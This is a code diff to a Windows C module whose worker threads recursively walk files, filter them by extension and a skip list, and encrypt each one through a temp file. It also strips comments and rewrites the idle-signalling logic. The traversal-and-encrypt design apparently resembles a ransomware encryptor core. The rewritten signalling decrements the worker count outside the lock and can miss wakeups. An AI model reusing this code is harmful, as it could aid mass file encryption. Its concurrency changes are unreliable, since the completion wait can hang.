@@ -59,12 +59,11 @@ struct FILEOPS_CTX {
     /* Work queue */
     struct WorkItem {
         struct WorkItem *next;
-        WCHAR   path[];              /* flexible array — zero-sized member */
+        WCHAR   path[];              /* flexible array */
     }                *queueHead;
     struct WorkItem **queueTail;
     volatile LONG     queueCount;
 
-    /* Tracks number of workers currently executing a file */
     volatile LONG     activeWorkers;
 
     CRITICAL_SECTION  queueLock;
@@ -82,14 +81,14 @@ static DWORD WINAPI WorkerThread(LPVOID lpParam) {
         struct WorkItem *item = NULL;
 
         EnterCriticalSection(&ctx->queueLock);
+
+        /* Wait while queue is empty and not shutting down */
         while (ctx->queueHead == NULL && !ctx->shutdownFlag) {
-            if (ctx->queueCount == 0 && ctx->activeWorkers == 0) {
-                WakeAllConditionVariable(&ctx->queueIdle);
-            }
             SleepConditionVariableCS(&ctx->queueNotEmpty,
                                      &ctx->queueLock, INFINITE);
         }
 
+        /* If shutting down and nothing left, exit */
         if (ctx->shutdownFlag && ctx->queueHead == NULL) {
             LeaveCriticalSection(&ctx->queueLock);
             break;
@@ -119,12 +118,9 @@ static DWORD WINAPI WorkerThread(LPVOID lpParam) {
             ctx->stats.filesFailed++;
             LeaveCriticalSection(&ctx->statsLock);
 
-            EnterCriticalSection(&ctx->queueLock);
             InterlockedDecrement(&ctx->activeWorkers);
-            if (ctx->queueCount == 0 && ctx->activeWorkers == 0) {
-                WakeAllConditionVariable(&ctx->queueIdle);
-            }
-            LeaveCriticalSection(&ctx->queueLock);
+            /* Wake up anyone waiting for idle */
+            WakeConditionVariable(&ctx->queueIdle);
             continue;
         }
 
@@ -133,6 +129,7 @@ static DWORD WINAPI WorkerThread(LPVOID lpParam) {
         BYTE  *buf   = NULL;
         BYTE  *plaintext = NULL;
         DWORD  bufSize = 0;
+        DWORD  fs = 0;
         bool   success = false;
 
         hFile = CreateFileA(narrowPath, GENERIC_READ, FILE_SHARE_READ,
@@ -142,23 +139,17 @@ static DWORD WINAPI WorkerThread(LPVOID lpParam) {
             goto worker_done_file;
         }
 
-        DWORD fs = GetFileSize(hFile, NULL);
+        fs = GetFileSize(hFile, NULL);
         if (fs == INVALID_FILE_SIZE || fs < 1) {
             goto worker_done_file;
         }
 
-        /* Use CRYPTO_REQUIRED_CAPACITY from crypto.h for correct buffer sizing:
-         *   = fs + ENCRYPT_OVERHEAD(64) + AES_BLOCK_SIZE(16)
-         *   = fs + 80
-         * This accommodates: salt(16) + iv(16) + hmac(32) + padded ciphertext */
         bufSize = CRYPTO_REQUIRED_CAPACITY(fs);
         buf = (BYTE *)VirtualAlloc(NULL, bufSize,
                                    MEM_COMMIT | MEM_RESERVE,
                                    PAGE_READWRITE);
         if (!buf) goto worker_done_file;
 
-        /* Read file into separate plaintext buffer (EncryptBuffer requires
-         * non-overlapping plaintext and ciphertext buffers) */
         plaintext = (BYTE *)VirtualAlloc(NULL, fs,
                                          MEM_COMMIT | MEM_RESERVE,
                                          PAGE_READWRITE);
@@ -172,15 +163,13 @@ static DWORD WINAPI WorkerThread(LPVOID lpParam) {
         CloseHandle(hFile);
         hFile = INVALID_HANDLE_VALUE;
 
-        /* Encrypt: writes [salt(16) | iv(16) | hmac(32) | ciphertext(padded)]
-         * into buf, total size returned in encLen */
         DWORD encLen = 0;
         CRYPTO_ERROR cerr = EncryptBuffer(GetCryptoCtx(),
-                                          plaintext,     /* input plaintext      */
-                                          rd,            /* plaintext length     */
-                                          buf,           /* output ciphertext    */
-                                          &encLen,       /* output length        */
-                                          bufSize);      /* buffer capacity      */
+                                          plaintext,
+                                          rd,
+                                          buf,
+                                          &encLen,
+                                          bufSize);
 
         SecureZeroMemory(plaintext, fs);
         VirtualFree(plaintext, 0, MEM_RELEASE);
@@ -190,7 +179,7 @@ static DWORD WINAPI WorkerThread(LPVOID lpParam) {
             goto worker_done_file;
         }
 
-        /* ── Build temp path with overflow check ── */
+        /* ── Build temp path ── */
         char tmpPath[FILEOPS_MAX_PATH];
         int tmpLen = snprintf(tmpPath, sizeof(tmpPath), "%s.tmp", narrowPath);
         if (tmpLen < 0 || tmpLen >= (int)sizeof(tmpPath)) {
@@ -247,20 +236,13 @@ static DWORD WINAPI WorkerThread(LPVOID lpParam) {
         if (buf) {
             SecureZeroMemory(buf, bufSize);
             VirtualFree(buf, 0, MEM_RELEASE);
-        }
-        if (plaintext) {
-            SecureZeroMemory(plaintext, fs);
-            VirtualFree(plaintext, 0, MEM_RELEASE);
+            buf = NULL;
         }
         if (hFile != INVALID_HANDLE_VALUE) CloseHandle(hFile);
 
-        /* ── Decrement active workers and signal idle if appropriate ── */
-        EnterCriticalSection(&ctx->queueLock);
+        /* ── Decrement active workers and signal idle ── */
         InterlockedDecrement(&ctx->activeWorkers);
-        if (ctx->queueCount == 0 && ctx->activeWorkers == 0) {
-            WakeAllConditionVariable(&ctx->queueIdle);
-        }
-        LeaveCriticalSection(&ctx->queueLock);
+        WakeConditionVariable(&ctx->queueIdle);
     }
 
     return 0;
@@ -268,9 +250,10 @@ static DWORD WINAPI WorkerThread(LPVOID lpParam) {
 
 /* ── Enqueue a single file ── */
 static void EnqueueFile(FILEOPS_CTX *ctx, const WCHAR *fullPath) {
+    if (!ctx || !fullPath) return;
+
     size_t pathBytes = (wcslen(fullPath) + 1) * sizeof(WCHAR);
 
-    /* Flexible array path[] is zero-sized — allocate exactly the bytes needed */
     struct WorkItem *item = (struct WorkItem *)
         HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY,
                   sizeof(struct WorkItem) + pathBytes);
@@ -357,7 +340,7 @@ FILEOPS_CTX* FileOps_CreateContext(const FILEOPS_CONFIG* config) {
         ctx->config.ioBufferSize = FILEOPS_IO_CHUNK;
         ctx->config.flags = FILEOPS_FLAG_RECURSIVE;
         ctx->config.extension[0] = L'\0';
-         ctx->config.pfnShouldSkip = NULL;
+        ctx->config.pfnShouldSkip = NULL;
     }
 
     if (ctx->config.threadCount < 1)
@@ -368,7 +351,6 @@ FILEOPS_CTX* FileOps_CreateContext(const FILEOPS_CONFIG* config) {
     ctx->queueTail = &ctx->queueHead;
     ctx->threadCount = ctx->config.threadCount;
 
-    /* Initialise stats lock once (lazy-init guard is below) */
     InitializeCriticalSection(&ctx->statsLock);
     ctx->statsInitialized = true;
 
@@ -390,6 +372,8 @@ FILEOPS_CTX* FileOps_CreateContext(const FILEOPS_CONFIG* config) {
         HANDLE h = CreateThread(NULL, 0, WorkerThread, ctx, 0, NULL);
         if (h) {
             ctx->threads[i] = h;
+        } else {
+            ctx->threads[i] = NULL;
         }
     }
 
@@ -420,10 +404,6 @@ void FileOps_WaitForCompletion(FILEOPS_CTX* ctx) {
 
     EnterCriticalSection(&ctx->queueLock);
     while (ctx->queueCount > 0 || ctx->activeWorkers > 0) {
-        /* If queue is empty and no active workers, we're done.
-         * Otherwise wait for the conditional variable. */
-        if (ctx->queueCount == 0 && ctx->activeWorkers == 0)
-            break;
         SleepConditionVariableCS(&ctx->queueIdle,
                                  &ctx->queueLock, INFINITE);
     }
@@ -475,7 +455,6 @@ static bool ShouldSkip(const WCHAR* path) {
         return false;
 
     for (int i = 0; g_skip[i]; i++) {
-        /* Simple case-insensitive substring check */
         char *found = strstr(narrow, g_skip[i]);
         if (found) return true;
     }
@@ -495,7 +474,7 @@ static bool IsTargetExtension(const char* path) {
     return false;
 }
 
-/* ── Global config & context (simplified high-level API) ── */
+/* ── Global context ── */
 static FILEOPS_CTX *g_ctx = NULL;
 
 bool InitFileOps(int threadCount) {
@@ -521,7 +500,6 @@ void CleanupFileOps(void) {
 bool EncryptSingleFile(const char *narrowPath) {
     if (!g_ctx || !narrowPath) return false;
 
-    /* Convert to wide */
     WCHAR wide[FILEOPS_MAX_PATH];
     int wlen = MultiByteToWideChar(CP_UTF8, 0, narrowPath, -1,
                                     wide, FILEOPS_MAX_PATH);
